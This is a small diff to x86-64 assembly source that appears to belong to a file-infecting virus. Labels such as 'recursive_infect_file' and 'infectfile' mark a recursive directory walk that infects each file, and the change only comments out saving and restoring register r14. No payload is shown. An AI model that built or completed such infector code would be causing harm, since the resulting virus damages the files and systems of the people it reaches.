@@ -77,7 +77,7 @@ recursive:
 
 	recursive_infect_file:
 
-	push r14					; saves the important register used in infectfile
+;	push r14					; saves the important register used in infectfile
 	push r13
 	push r12
 	push r8
@@ -86,7 +86,7 @@ recursive:
 	pop r8
 	pop r12
 	pop r13
-	pop r14
+;	pop r14
 
 	jmp end_recur				; loop to the next file
 	true_start_recur:			; loop to the next file if the directories are . and ..
